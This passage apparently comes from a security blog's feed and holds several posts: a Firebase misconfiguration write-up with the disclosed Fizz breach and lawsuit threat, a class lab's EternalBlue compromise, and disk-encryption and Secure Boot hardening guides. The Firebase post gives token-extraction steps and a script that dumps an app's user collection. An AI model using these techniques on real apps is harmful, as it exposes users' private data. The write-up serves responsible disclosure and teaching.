warnings.\nExacerbating this issue is “Test Mode”, the default Firebase security configuration when initially setting up an app. Test Mode grants read and write access on all data to all users on the open internet (regardless of whether they have an app account or not) using the following rule:\nmatch /{document=**} { allow read, write: if request.time \u0026lt; timestamp.date(2022, 10, 13); } This is great in a pre-launch environment when nobody but the developers know of the existence of the Firebase project. However, in early-stage startups, security often takes a backseat to other development tasks, and it’s not a rare occurrence that Firebase collections are often left in Test Mode well after launch.\nIn fact, a 2020 report by Comparitech showed that nearly eight percent of Android apps on the Google Play Store using Firebase had security rules that allowed attackers to potentially read personal user information without even requiring authentication. More than 75 percent of these apps also allowed write access by arbitrary users on their database collections. There are likely even more apps that are vulnerable to data access by authenticated users of other users’ personal information (i.e., user authentication is required to access a collection, but once a user has authenticated they can access any other user’s data).\nThese Firebase issues represent a larger class of security vulnerabilities known as HospitalGown, where client-side applications connect to a completely exposed backend that simply allow malicious users to query for data they should not have access to.\nAnatomy of a Firebase data breach The overarching idea of finding an unauthorized data access vulnerability in a Firebase client app is to pretend to be a client that can request anything from the datastore regardless of what data the real client queries for.\nBecoming a Firebase client To identify oneself as a client to Firebase involves using a set of API tokens of the following format:\n{ apiKey: \u0026quot;AIzaSyCad_1JSDfJBl399DFkseNqR63246PLEF4\u0026quot;, // created by keyboard mashing authDomain: \u0026quot;my-project.firebaseapp.com\u0026quot;, projectId: \u0026quot;my-project\u0026quot;, storageBucket: \u0026quot;my-project.appspot.com\u0026quot;, databaseURL: \u0026quot;https://my-project.firebaseio.com\u0026quot;, // used only by RTDB messagingSenderId: \u0026quot;70263983361\u0026quot;, // randomized appId: \u0026quot;1:70263983361:web:907b0c94510e7549e1ae94\u0026quot; // randomized } It\u0026rsquo;s not particularly difficult to find these tokens:\nOn Web apps, they are typically located somewhere in the minified Javascript source code for the page - typically, search for the phrase appspot and you should be able to find them (already in JSON format). For Android apps, you can download the app APK to your computer using a tool such as this one. After decompiling the app using apktool, you can find the keys in the file res/values/strings.xml by searching for the keyword firebase. You\u0026rsquo;ll want the values associated with the following XML keys: gcm_defaultSenderId google_api_key firebase_url (for RTDB client apps) google_storage_bucket google_app_id project_id iOS apps are a little trickier, and finding the tokens usually requires access to a jailbroken iPhone or iPad. To find the tokens, ssh into the iPhone and navigate to the directory /var/containers/Bundle/Application. Find the UUID of the app by running find | grep com.appdev.app_name, then run cd app_uuid/app_name.app. The tokens are located in the file GoogleService-Info.plist. This file might be binary encoded and may require using a tool like plistutil to reveal in plaintext; this can be done by using scp to transfer the file back to your computer. You\u0026rsquo;ll want the values associated with the following keys: API_KEY DATABASE_URL (for RTDB client apps) GCM_SENDER_ID GOOGLE_APP_ID PROJECT_ID STORAGE_BUCKET Probing the datastore Once you have the API tokens, the easiest way to start spelunking around the database is to use Baserunner, which allows you to set a Firebase config in JSON format for a particular app and then authenticate into that app if necessary. Authentication is supported via email/password, phone number/OTP, and via Google account (this was my contribution, and the motivation and implementation of this feature will be the subject of a future blog post).\nOnce authenticated into the datastore for the app you\u0026rsquo;re testing, you can use a query template to start trying to request data from CFS or RTDB (depending on what the app uses). Doing so requires knowing or guessing collection and potentially document names that correspond to valid data for the app. There are ways to make this easier, such as searching through Javascript source code in web or React Native apps, or by using a gRPC-capable proxy such as mitmproxy to intercept and inspect requests between mobile clients and Firebase.\nNote that many Firebase client apps and websites often use SSL certificate pinning when accessing the database, making traffic proxying difficult. One workaround might be to use one of mitmproxy\u0026rsquo;s suggested certificate pinning bypass techniques, although I haven\u0026rsquo;t tried any of them.\nHowever, if you\u0026rsquo;re blindly guessing at names, keep in mind how Cloud Firestore and Realtime Database structure their data models, especially this restriction for Cloud Firestore:\nNotice the alternating pattern of collections and documents. Your collections and documents must always follow this pattern. You cannot reference a collection in a collection or a document in a document.\nNote that if you try to access an invalid data path, Firebase\u0026rsquo;s client library used in Baserunner will always return a permission denied error. This is due to a security feature in Firebase that prevents distinguishing on the frontend if a data path is invalid or if security rules prevent the authenticated user from accessing that data path. To make sure your tooling is working, try accessing a data path that you know you should have access to (which you can probably find by inspecting web requests or Javascript minified source).\nCase study: the Fizz vulnerabilities Fizz, formerly Buzz, is an iOS-only social messaging platform for sharing posts and associated comments that’s popular at Stanford and other college campuses. The app is structured such that each user has an account that requires a community-affiliated email to verify membership, but can post anonymously. Users can accrue points based on the popularity of their posts.\nOwing to its purportedly anonymous nature, Fizz posts can often consist of highly sensitive information. For example, users often use the platform to talk about their LGBTQ+ identity, even while in family situations that are not supportive of said identity.\nConducting security testing on Fizz In November 2021, Miles McCain, Cooper de Nicola, and I did an inspection of Fizz\u0026rsquo;s security posture and found significant data leakage due to the app\u0026rsquo;s developers having misconfigured their Firebase security rules.\nTo do this testing, we first used the aforementioned iOS token extraction technique to pull the Firebase API keys off a jailbroken iPhone 6S.\nWe did the inspection before we knew of Baserunner\u0026rsquo;s existence, so we wrote a Node.js script based on the Firebase SDK that could identify itself to Firebase as Fizz using the tokens we found in the app files.\nimport { initializeApp } from 'firebase/app'; import { getFirestore, collection, getDocs } from 'firebase/firestore/lite'; import { getAuth, createUserWithEmailAndPassword, deleteUser } from \u0026quot;firebase/auth\u0026quot;; const firebaseConfig = { // Fizz tokens go here }; const app = initializeApp(firebaseConfig); const db = getFirestore(app); const auth = getAuth(); createUserWithEmailAndPassword( auth, \u0026quot;not-real-user-\u0026quot; + Math.random() + \u0026quot;@test.com\u0026quot;, \u0026quot;foo\u0026quot; ).then((userCredential)) =\u0026gt; { getDocs(collection(db, \u0026quot;users\u0026quot;)).then(x =\u0026gt; { x.forEach((doc) =\u0026gt; { console.log(JSON.stringify(doc.data())); }); }); deleteUser(auth.currentUser); }; Fizz\u0026rsquo;s minimal security rules required a user session to be active when data is requested from the database, and their user authentication model at the time consisted of sending a sign-in link to the user\u0026rsquo;s email. Simulating this would have been extremely difficult with a script; Baserunner is much easier to use here as it saves such state for you in the session.\nHowever, the email associated with a user session did not need to be affiliated with a member community in order to access data. Thus, we were able to make temporary users with email not-real-user-RANDOM@test.com for each run of the script.\nPulling out the data We first requested the users collection; this contained the expected information such as emails, phone numbers, app points accrued, and moderator status. We noticed there was also a userID field and theorized that this field would be what connected the users and posts collections.\nWe were then able to request the posts collection; finding this was a bit trickier because the table was namespaced under a specific member of the communities collection. That is, each community has its own posts table.\nThis contained a treasure trove of information for each post including post content, pseudonyms, the user ID of the user that created it, the user IDs of the users that upvoted and downvoted the posts, and more. This effectively broke app anonymity because with a join of the users and posts collection on the user ID fields, each post’s author could be identified down to their email address and/or phone number.\nWe also found that the users collection could be modified. We were able to change the points value of my user account to 99 trillion, and the modification was then reflected when opening the app.\nMore concerning, however, was that we could easily promote the account to be a moderator by simply changing the isModerator field on my account from null to true. This gave me access to a moderation UI and the ability to delete arbitrary posts from the app itself, including those made by accounts that were not my own (note that the only posts that were deleted were created by Miles for testing purposes). We reverted all modifications immediately after taking screenshots from the app for documentation purposes, and we only modified accounts that we had express consent from the owners to access (indeed, the only accounts we modified were our own)..\nDisclosure Concerned about user privacy and security — and consistent with industry best practices — we wrote a detailed email to the Fizz team on November 8, 2021 documenting the issues and explaining how to fix them. Given how fundamental this vulnerability was, we believe it is possible that it was noticed (and perhaps even abused) by others before we discovered it. We felt strongly that Fizz had an obligation to notify their users of the issue. In order to give Fizz enough time to resolve the vulnerability itself, we agreed not to publicly disclose the issue ourselves until December 8.\nFizz\u0026rsquo;s response: initial courtesy, then a lawsuit threat Fizz initially thanked us for our report, and they worked to fix the issue. Over the course of several emails, we thanked the Fizz team for handling our report well and advised them on the effectiveness of their fix. Things were looking good, and on November 22, Fizz let us know that they considered the original vulnerability fixed.\nIn that email, however, they also attached an aggressive legal threat from their lawyer at Hopkins \u0026amp; Carley, a Silicon Valley law firm. The letter demanded that, unless we agreed to various terms — including staying silent about vulnerabilities we discovered in Fizz and their misleading claims on encryption and user anonymity — they would “pursue charges.” If we didn\u0026rsquo;t agree to gag ourselves within five calendar days (most of those days occurring over the Thanksgiving holiday), they threatened to \u0026ldquo;pursue charges\u0026rdquo; in the form of civil, criminal, and disciplinary action. They alleged that by performing a security audit on their systems, we had violated the Computer Fraud and Abuse Act (CFAA) and the Digital Millennium Copyright Act (DMCA).\nThe next day, our friend Jack Cable, a fellow Stanford student and security researcher, reached out to Kurt Opsahl and Andrew Crocker of the Electronic Frontier Foundation, who agreed to represent us pro bono in the dispute. On our behalf, they sent a letter that disputed Fizz\u0026rsquo;s claims of DMCA and CFAA violations. Additionally, they noted that Fizz\u0026rsquo;s lawyers conditioning of criminal charges on our signing of an NDA violated a California bar rule.\nAfter the EFF’s letter was received, Fizz’s founders posted a public security notice on their website on December 7, informing users that they had adequately remediated the issues following our disclosure. But the presentation of that statement was somewhat questionable, as it was presented to Fizz users only when opening the app for the first time post-disclosure and framed as mere \u0026ldquo;security improvements\u0026rdquo; rather than the severe data breach it really was. Additionally, their statement did not adequately disclose the fact that we were able to deanonymize every single post on the app.\nOutside of some limited word-of-mouth communication, most Fizz users likely were not informed of how severe the vulnerabilities we found were until the Stanford Daily released its article about the situation nearly a year later.\nRemediation and conclusions Firebase vulnerabilities are unfortunately all too common and can be quite devastating for certain business models, as the Fizz case study shows. Fizz was not the only app that we were able to find significant Firebase vulnerabilities in; we and other Stanford security researchers have identified this type of issue in numerous other startup apps.\nFor this class of Firebase-related vulnerabilities specifically, remediation must be done through careful application of security rules to the datastore in order to restrict data to only those that are authorized to see it. Due to the semantics of how these rules are interpreted, doing so is tricky. Many other apps I’ve inspected have made good attempts to write these rules but were still susceptible to unauthorized data accesses through edge cases. Developers must be extremely careful to test every potential user role and every data access path to confirm the efficacy of their rules.\nAnother thing I\u0026rsquo;ve seen apps do is use simplistic rules that are nearly as insecure as Test Mode, such as permitting all requests by authenticated users. Such rules sometimes end up being a suggested implementation by introductory development tutorials.\nNot all the blame can be placed entirely on developers. In my opinion, Google does not go far enough to help developers protect themselves against these vulnerabilities. When choosing Test Mode in the console for a Firebase database, there is a warning displayed about such issues, and by default Test Mode expires 30 days after creation. Google bombards developers with emails about Test Mode expiry containing a short warning about unauthorized data accesses.\nHowever, I think developers tend to continuously reset the Test Mode timer well into the production cycle rather than working on better security rules, particularly if they are in a rapid-growth and feature-addition phase. In addition, Google has no way of warning developers of nearly-as-insecure rules such as those mentioned above.\nGoogle should add stronger warnings to Firebase documentation in addition to emails and the console, such that developers truly understand the importance of setting proper security rules in a timely manner. This documentation must be easily accessible and written in a way that new developers can understand and implement these rules, given Firebase\u0026rsquo;s target market. Additionally, Google should also develop a way to click on any collection or document and see exactly which users or roles have access to that document. This would allow developers to self-test their rules without too much extra effort.\nBroadly, startups having poor security is not just a Firebase problem, but rather a systemic one. Security is almost never a required course for any university computer science curriculum, including at Stanford, leading to student startups not knowing where to start in terms of securely designing their product. Even when they do, the \u0026ldquo;move fast, break things\u0026rdquo; mindset of the wider startup culture and ecosystem incentivizes startups to concentrate on rapid growth and scale rather than robust and secure development.\nThis means that the culture around early-stage startups and computer science curricula must change to incorporate the importance of security and safety as a core foundation. Such a change must be embraced by educators, entrepreneurs, and venture capitalists to further a security culture.\nAs the Fizz case study demonstrates, Stanford is one place this culture shift is desperately needed. As such, I\u0026rsquo;m trying to focus many of my efforts this year as Vice President of Stanford\u0026rsquo;s Applied Cybersecurity club on two goals: making security cool, and making people take security seriously. I plan to write more on this topic in the near future.\n","date":"2022-11-14","permalink":"https://saligrama.io/blog/post/firebase-insecure-by-default/","tags":[],"title":"Firebase: Insecure by Default (feat. that one time our classmates tried to sue us)"},{"content":"This morning, an EternalBlue-vulnerable machine used for testing for Stanford\u0026rsquo;s Hack Lab course accidentally given a public IP address on Google Cloud was unsurprisingly pwned and used to launch further EternalBlue scanning against other public web hosts.\nThis blog post describes our course\u0026rsquo;s infrastructure setup (including why we had that testing box in the first place), how we discovered and remediated the incident, and how we used the incident as a way to teach students about incident response and public disclosure.\nHack Lab\u0026rsquo;s Google Cloud infrastructure Hack Lab is Stanford\u0026rsquo;s introduction to cybersecurity, cyberlaw, and cyber policy class, with nearly 180 students enrolled. This fall, I\u0026rsquo;m one of five TAs for the class, and I had the responsibility of building much of our course infrastructure on Google Cloud (GCP)\u0026rsquo;s Compute Engine before the quarter started.\nWhy GCP? We need to provide students with tools for learning about cyber topics during lab sections such as Burp Suite, Wireshark, nmap, and others. Previously, we used to give each student a Kali Linux virtual machine (VM) download preprovisioned with these tools. However, as more and more students use M1 Macs that don\u0026rsquo;t support standard x86-64 virtualization, this solution started to become difficult to maintain.\nThis year, we decided to move those Kali VMs to the cloud to simplify our setup. Students can either use remote desktop or SSH to access the machines and use the security tools we\u0026rsquo;ve set up for them. Each machine has a public IP address attached, as well as a hostname via GCP\u0026rsquo;s DNS support set up for easier access.\nSetting up an EternalBlue lab This week\u0026rsquo;s lab concerns buffer overflows and corporate intrusion, where students learn to use Metasploit to break into an EternalBlue-vulnerable Windows host. Each student gets their own vulnerable Windows Server 2008 virtual machine on a private subnet, which they learn how to gain administrator access on and find flags on the system that they use to pass the lab.\nSetting up this lab was nontrivial, as our first worry was GCP\u0026rsquo;s tendency to automatically patch Windows and Linux hosts running vulnerable software. We thought this would be an issue for the lab. As it turns out, however, autopatching only happens when the machines are accessible to the public internet and have GCP\u0026rsquo;s VM manager agent installed, neither of which applied to our machines.\nThe real issue, in fact, was configuring our own GCP networks and firewalls to allow the necessary network accesses for EternalBlue break-ins. This required creating the Windows subnet on the right GCP region and zone, locking down the Windows machines to only have private IPs, and opening the right ports on the Windows machines to expose SMB and on the Kali machines to enable the use of reverse shell listeners.\nFiguring these cloud nuances out took us much of the night of Sunday, October 9 into Monday, October 10, as well as much of Monday itself. Eventually we were able to get everything to work and published the lab on 1:30am Tuesday morning, before students had to start working on them at 8:30am. Luckily, students didn\u0026rsquo;t seem to have major issues completing the lab that day.\nHack Lab gets hacked Notification of a possible pwn This morning, I woke up to three emails from GCP sent between the hours of 4:00am and 6:00am that notified us that our course infrastructure was used to conduct port scans against nearly 230,000 IP addresses for EternalBlue vulnerability.\nIn my sleep-addled state when I got up, my first thought was \u0026ldquo;this doesn\u0026rsquo;t look super legit to me, as when Google wants to tell you that your security sucks, usually it\u0026rsquo;s a robot sending an email and not a human.\u0026rdquo; But then I was able to verify the identity of the sender and the legitimacy of the email \u0026ndash; at which point I thought \u0026ldquo;we\u0026rsquo;re running a hacking class where we\u0026rsquo;re telling students to EternalBlue their way into machines, of course there\u0026rsquo;s gonna be suspicious-looking traffic on the network.\u0026rdquo;\nAt that point I read the sentence that warned us about a machine being used to scan nearly 230,000 IP addresses between 12:40am and 2:50am, and it finally dawned on me that this couldn\u0026rsquo;t possibly be a student and that something was up here.\nA hurried incident response By now, it was nearly 9am and students would start using the machines again during the first lab section of the day at 10:30am. I called our head TA Cooper de Nicola so we could figure out what was going on, accidentally waking him after a few nights of less-than-satisfactory sleep (sorry Cooper :/).\nWe quickly determined that the IP address we were emailed about was a test machine we created at 4:24am on Monday morning with the name win-final-template-1-attackme1. In our sleep-addled state that day, we had accidentally given an EternalBlue-vulnerable machine a public IP address, exposing it to the web and the dangers (i.e., automated scanners) that lurk in the wild.\nOur first course of action was to immediately shut down and destroy that VM instance, as well as a few other similar test machines that had similar issues. Given our time constraints, we decided we wouldn\u0026rsquo;t be able to do a thorough investigation of what the attacker was trying to do with our pwned box.\nOur best theory is that we were simply targeted by an automated web scanner that detected our EternalBlue vulnerability, broke into the machine, and then started using that machine to repeatedly scan web hosts on the public internet for EternalBlue vulnerabilties (given the targeting of port 445 in particular). However, it\u0026rsquo;s entirely possible that the attacker also installed malware or a cryptominer on the machine.\nIt\u0026rsquo;s extremely rare that attackers can break out of a GCP virtual machine to gain access to the broader GCP project, so we felt relatively safe that the project itself hadn\u0026rsquo;t been maliciously accessed. However, we couldn\u0026rsquo;t rule out the possibility that the student Windows or Kali machines had been broken into as well, so we decided to simply burn those VM instances down and rebuild it from scratch.\nThanks to the robust and maintainable infrastructure management code we built out before the quarter started, we were able to do this in only 15 minutes while only using 7 command-line commands and have everything ready well before the lab started at 10:30am. The only remaining issue was that some students received scary messages warning of an SSH man-in-the-middle attack as the VM fingerprint had changed on regeneration. We had to provide instructions so that students weren\u0026rsquo;t encumbered by this in the course of completing the lab.\nTurning the hack into a teachable moment Conveniently, this week at Hack Lab is when we teach about corporate intrusion, security research, and responsible disclosure in lecture. We decided we could use our own incident as a way of doing a public postmortem to our students and illustrating how to responsibly handle incidents like these. So Cooper and I got up on the stage of Dinkelspiel Auditorium and ate the humble pie.\nIn particular, we talked about how the breach happened, the (nonexistent) impact on students and their data, and how enterprises have an ethical obligation to inform their stakeholders about breaches once incidents are remediated. We feel that leading by example in this context is highly important given the less-than-stellar reputation of Stanford student startups with regards to properly handling vulnerability disclosures and other security incidents.\nConclusion This incident yields a couple of lessons for ourselves in the future here: always audit what infrastructure we have exposed to the public, and be extra careful running deliberately vulnerable services! In general, this hack demonstrates that breaches can happen to anyone, including the instructors of a cybersecurity class. As such, how one responds to a breach is as or more important than keeping things secure in the first place, and I\u0026rsquo;m pretty proud of our response here.\n","date":"2022-10-12","permalink":"https://saligrama.io/blog/post/hack-lab-got-hacked/","tags":[],"title":"Flipping the script: when a hacking class gets hacked"},{"content":"This is a continuation of my previous post about upgrading personal security. This post focuses on preventing evil maid attacks using disk encryption and secure boot.\nWith this post, I compiled and summarized all of the resources I used to do all of this configuration. The hope is that having a set of steps in one place reduces the need to go hunting across different Reddit posts, blog posts, and wiki articles as I did.\nRecap: physical threat model An evil maid attack is a situation where an attacker has physical access to a device. For now, the way I think about this scenario is that an attacker can have physical access to one of the following:\nPhone Laptop YubiKey Even with any one of these devices in their possession, the adversary should never be able to access any of our data or accounts. Additionally, we should not be locked out of our own accounts even with one device missing.\nDisclaimer: Full physical security is impossible to achieve on standard consumer laptops. This is a best effort using commonly available tools and methods, and will not protect against a determined (e.g. nation-state) adversary.\nRecap: hardware To recap, I\u0026rsquo;ll be using the following hardware for this post:\nLaptop: Lenovo ThinkPad X1 Carbon Gen 9 Runs a dual-boot setup with Arch Linux and Windows 11 Initially, both the Linux and Windows partitions were unencrypted Hardware security key: YubiKey 5C NFC Stage three: Linux disk encryption with FIDO2/YubiKey authentication These instructions will demonstrate how to encrypt the Linux partition in-place. If you were smarter than me when you initially set up the laptop and encrypted the disk, skip to the next step.\nNow it\u0026rsquo;s time to encrypt Linux data at rest using LUKS2. We start with the following disk setup:\n~ » lsblk NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINTS nvme0n1 259:0 0 476.9G 0 disk ├─nvme0n1p1 259:1 0 260M 0 part /boot # EFI ESP, systemd-boot ├─nvme0n1p2 259:2 0 16M 0 part # Windows reserved ├─nvme0n1p3 259:3 0 153.4G 0 part # Windows C: ├─nvme0n1p4 259:4 0 322.3G 0 part / # Arch Linux root, ext4 └─nvme0n1p5 259:5 0 1000M 0 part # Windows reserved Observe that the Linux root is currently unencrypted and not part of an LVM setup. I wanted to do the encryption without having to wipe the partition, set up LUKS2 on LVM, and then restore the data; I just wanted to encrypt-in-place. The Arch Linux wiki has documentation on how to do so, but hopefully my instructions below are a bit clearer.\nDisclaimer: For these steps to work, your /boot partition must be separate from your root partition. /boot must be unencrypted so the bootloader can load a kernel and initramfs that are capable of decrypting your root partition.\nDisclaimer: These steps are specific to a system that uses the systemd-boot bootloader. If you use GRUB or rEFInd, your configuration will likely look different.\nDisclaimer: I AM NOT RESPONSIBLE FOR ANY DATA LOSS YOU MIGHT ENCOUNTER FOLLOWING THESE INSTRUCTIONS.\nWith that out of the way, boot into an Arch Linux live USB and run the following commands.\n# 1. Check the file system for errors e2fsck -f /dev/nvme0n1p4 # 2. Reduce filesystem size by 32M # to make space for the LUKS header resize2fs -p /dev/nvme0n1p4 $(expr `fdisk -l | grep nvme0n1p4 | awk '{print $4}'` - 32768)s # 3. Encrypt the partition, reducing partition size by 32M. # Give it a secure password when requested. cryptsetup reencrypt --encrypt --reduce-device-size 32M /dev/nvme0n1p4 # 4. Open the encrypted partition with your password and mount it. cryptsetup open /dev/nvme0n1p4 root mount /dev/mapper/root /mnt mount /dev/nvme0n1p1 /mnt/boot Now we need to do some config editing.\nChroot into your system: arch-chroot /mnt\nEdit /etc/mkinitcpio.conf, add the following to the HOOKS section:\nsystemd keyboard sd-vconsole sd-encrypt Regenerate your initramfs: mkinitcpio -P linux\nFind the UUID of your root partition (not the encrypted volume within):\nblkid | grep nvme0n1p4 | awk '{print $2}' You want the value inside the quotes (i.e. UUID=\u0026quot;YOUR_UUID\u0026quot;).\nEdit your systemd-boot bootloader entry for Arch Linux (mine was in /boot/loader/entries/arch.conf).\nFind your kernel command-line parameters (the line starting with options) If you have a section in your kernel-line options for your root partition (e.g. root=/dev/nvme0n1p4 or root=UUID=SOME_UUID), remove it. Directly after options, add rd.luks.name=YOUR_UUID=root root=/dev/mapper/root Exit the chroot: exit\nReboot: reboot; then pull out the live USB.\nIf everything has gone correcty, you should be all set. Now, select the Arch Linux boot entry at the systemd-boot menu and you should be prompted to enter your LUKS passphrase during the boot process.\nOur disk configuration should now display as follows.\n~ » lsblk NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINTS nvme0n1 259:0 0 476.9G 0 disk ├─nvme0n1p1 259:1 0 260M 0 part /boot ├─nvme0n1p2 259:2 0 16M 0 part ├─nvme0n1p3 259:3 0 153.4G 0 part ├─nvme0n1p4 259:4 0 322.3G 0 part | └─root 254:0 0 322.3G 0 crypt / └─nvme0n1p5 259:5 0 1000M 0 part Disk decryption with FIDO2/YubiKey Since systemd version 248 (March 2021), it has been possible to enroll a YubiKey as a way to do LUKS decryption at boot. Doing so only takes a few steps on your running system (no need for a live USB here).\nEnroll the key: systemd-cryptenroll --fido2-device=auto /dev/nvme0n1p4 Edit /etc/crypttab.initramfs (may be nonexistent or empty) and add the following line: # \u0026lt;name\u0026gt; \u0026lt;device\u0026gt; \u0026lt;password\u0026gt; \u0026lt;options\u0026gt; root\t/dev/nvme0n1p4\t-\tfido2-device=auto Edit your bootloader entry for Arch Linux (i.e. /boot/loader/entries/arch.conf). Before the root=/dev/mapper/root entry in the options line, add rd.luks.options=fido2-device=auto Reboot, and you should be all set. Stage four: evil maid hardening Unfortunately, disk encryption is not enough to defend against an evil maid attack, even when the attacker only has at most a few minutes with your device. Up until now, the code running before you decrypt your disk during boot is both unencrypted (sitting on an unencrypted /boot partition) and unverified.\nThis means that an attacker can replace your kernel (i.e. /boot/vmlinuz-linux) and/or initramfs (i.e., /boot/initramfs-linux.img) with a backdoored one, which can, for example, steal your LUKS decryption passphrase with a keylogger. To remedy this, we enable UEFI Secure Boot in order to make sure all the code running at boot is trusted.\nSecure boot verifies that all code running at boot is cryptographically signed using a private key whose public key is embedded in the computer\u0026rsquo;s NVRAM. Secure Boot is not a panacea, but it at least allows us to move the chain of trust from the unencrypted boot partition to the laptop firmware. Your laptop firmware is also not great, but chances are there\u0026rsquo;s no way around that short of buying a new laptop. When you buy a laptop running Windows, the key embedded in the NVRAM is Microsoft\u0026rsquo;s key. However, it is possible to enroll your own key in the NVRAM as well. The way most mainstream Linux distributions deal with secure boot is to load Shim, a UEFI bootloader that is signed by Microsoft, that then loads the actual Linux bootloader (usually GRUB or rEFInd). Shim then verifies the GRUB EFI loader and the loaded kernel. However, Shim does not verify the initramfs \u0026ndash; in practice, this is difficult to do because the initramfs is highly machine-dependent and also changes with every kernel update. This means that a standard Shim-based secure boot setup still does not protect you from an evil maid attack, since the initramfs can still be backdoored. Instead, our setup will involve embedding our own public key for verification into the laptop\u0026rsquo;s NVRAM, whose private key will sign our kernel, initramfs, and associated resources. The only code that is allowed to boot on our machine is code signed by either our private key or Microsoft\u0026rsquo;s private key.\nWhy do we need to keep Microsoft\u0026rsquo;s key, considering we could just sign the Windows bootloader ourselves? Unfortunately, my laptop, a Lenovo ThinkPad X1 Carbon Gen 9, has Option ROM firmware for a hardware device, which means that the Microsoft key is required to even initialize the device in the first place. There are plans to support initializing these devices without the Microsoft key in Linux secure boot managers such as sbctl. However, the current implementation is experimental. Actually implementing a fully trusted boot chain on Linux is tricky, and there have been reports that doing this improperly can brick your laptop.\nAs such, treat the following instructions as specific to my laptop (a Lenovo ThinkPad X1 Carbon Gen 9). These instructions follow from a Reddit comment I made on the subject in early May.\nDisclaimer: I AM NOT RESPONSIBLE FOR ANY DATA OR EQUIPMENT LOSS YOU MIGHT ENCOUNTER FOLLOWING THESE INSTRUCTIONS.\nPreparation: booting from a unified kernel image A Unified Kernel Image is a compilation containing the following:\nUEFI bootloader executable Linux kernel initramfs Kernel command-line arguments An optional splash screen Setting one up and configuring your system to boot from it is not particularly difficult. Morten Linderud/Foxboron, an Arch Linux maintainer, has a great guide on the subject. To summarize:\nEdit /etc/mkinitcpio.d/linux.preset Add the following lines: ALL_microcode=(/boot/*-ucode.img) default_efi_image=\u0026quot;/boot/EFI/Linux/linux.efi\u0026quot; default_options=\u0026quot;--splash /usr/share/systemd/bootctl/splash-arch.bmp\u0026quot; fallback_efi_image=\u0026quot;/boot/EFI/Linux/fallback.efi\u0026quot; Edit the line starting with fallback_options to contain fallback_options=\u0026quot;-S autodetect --splash /usr/share/systemd/bootctl/splash-arch.bmp\u0026quot; cat /proc/cmdline \u0026gt; /etc/kernel/cmdline Remove any references to initrd/initramfs. mkinitcpio -P linux Reboot and make sure that you have two new entries in your systemd-boot menu: one for Arch Linux, and one for Arch Linux fallback You can now safely remove /boot/loader/entries/arch.conf. Enrolling your key into secure boot Doing this used to be an extremely painful process, but luckily the sbctl tool makes this significantly easier.\nThese instructions were what worked on my system, and many steps were previously scattered across numerous blog posts, wiki pages, and Reddit comments. Part of my motivation for writing this post was to centralize these steps, at least for my newer ThinkPad, since the system will brick if this is done improperly.\nReboot into your UEFI interface and enable secure boot. Set the secure boot mode setting to \u0026ldquo;Setup mode,\u0026rdquo; which allows enrolling new keys. Then boot back into Arch. # Execute the following instructions as root # 2. Install sbctl pacman -S sbctl # 3. Create a keypair # The private key in this keypair is used to sign all # EFI code loaded at boot, which means that without the # signature, you will not be able to boot into Linux. # MAKE SURE YOU DO NOT LOSE THE PRIVATE KEY. sbctl create-keys # 4. Enroll your keys while keeping Microsoft's keys. # Experimentally, Option ROM devices can be supported # using `sbctl enroll-keys --tpm-eventlog`, but I have # not tested this and IT COULD LEAD TO EQUIPMENT LOSS. sbctl enroll-keys --microsoft # 5. Sign each of the EFI files that may appear somewhere # in the boot chain. The following files are specific # to my configuration, double check that you sign everything # you need to for your setup. sbctl sign -s /boot/EFI/Linux/linux.efi sbctl sign -s /boot/EFI/Linux/fallback.efi sbctl sign -s /boot/EFI/systemd/systemd-bootx64.efi sbctl sign -s /boot/EFI/Boot/bootx64.efi sbctl sign -s /boot/EFI/Microsoft/bootmgfw.efi sbctl sign -s /boot/EFI/Microsoft/bootmgr.efi sbctl sign -s /boot/EFI/Microsoft/memtest.efi # 6. Verify that all the files you need are signed sbctl list-files # 7. Verify that the sbctl pacman hook works on a kernel upgrade. # Ensure that the string \u0026quot;Signing EFI binaries...\u0026quot; appears. pacman -S linux Reboot into the UEFI interface and ensure that Secure Boot is still enabled. Verify that the Secure Boot mode setting has changed to \u0026ldquo;User mode.\u0026rdquo;\nTest booting into Arch, Arch fallback, and Windows. All should succeed without issues.\nSecuring the Windows partition with BitLocker At this point we can go ahead and simply enable BitLocker in Windows settings. Why did we need to wait this long?\nThe modern BitLocker implementation uses the hardware trusted platform module (TPM) to store the disk decryption key. Windows requires everything in the boot chain to be signed before it can retrieve the key from the TPM. This requires secure boot to be enabled. Without secure boot, we would be prompted for a long, randomly generated recovery password every single time we wanted to start Windows. Setting a UEFI password We\u0026rsquo;re not quite done yet: with access to the UEFI interface, an attacker could simply turn secure boot off, completely nullifying all the work we just did.\nNearly every UEFI implementation allows setting a password, so go ahead and do so. Make sure the password protects both the firmware interface itself and the boot device selector.\nWhy do we need to protect the boot list? We want to prevent an attack where the adversary can boot an Ubuntu or Fedora LiveUSB (whose loaders are Shim, trusted with Microsoft\u0026rsquo;s key), and then plant Shim, a signed kernel, and a backdoored initramfs on the unencrypted boot partition. Protecting the boot list both prevents an adversary from booting a LiveUSB and from being able to boot Shim once the attack is carried out. Finishing up: disabling Windows recovery Lastly, in Windows, we want to disable the recovery environment, which allows manipulating boot priority or booting to a USB.\nThis is pretty simple. Open Command Prompt as administrator and run reagentc /disable. Closing At this point, you should be reasonably protected from Evil Maid attacks. An adversary would probably need to carefully manipulate the boot priority list in the NVRAM in order to have any chance at mounting an attack. This requires a flash programmer and lots of time.\nOf course, this still leaves you susceptible to an $5 wrench attack. But this isn\u0026rsquo;t in the threat model, and if you\u0026rsquo;ve reached this point, you probably have bigger problems than your data.\nAcknowledgement: Thanks to Cody Ho for suggestions and edits.\n","date":"2022-05-04","permalink":"https://saligrama.io/blog/post/upgrading-personal-security-evil-maid/","tags":[],"title":"Upgrading my personal security, part two: disk encryption and secure boot"},{"content":"I\u0026rsquo;m someone who\u0026rsquo;s been reasonably technical for a long time, but was not really interested in security until about a year and a half ago. This means I had a lot of configuration set up for convenience, but without much in the way of security.\nIn the last few weeks, I started to change that and significantly upgraded my personal security. This post covers the first steps I took towards that end, starting with password generation and better two-factor authentication.\nThreat model Before delving into the details, we should take a moment to lay out a threat model \u0026ndash; the types of attacks that an attacker is permitted to perform and that our setup should be able to reasonably defend against.\nThis is important because an adversary with significant resources (e.g. a nation-state actor) will always win. If you have such a determined attacker trying to break into your system, then you probably have bigger problems than reading this blog post.\nRemote threat model This is the situation where an attacker doesn\u0026rsquo;t have physical access to your system. Such an attacker\u0026rsquo;s capabilities include:\nBrowser-based malware Phishing/social engineering Password cracking Open-source intelligence (OSINT) SIM-swapping Shoulder-surfing Personal information dumps from poorly secured services An 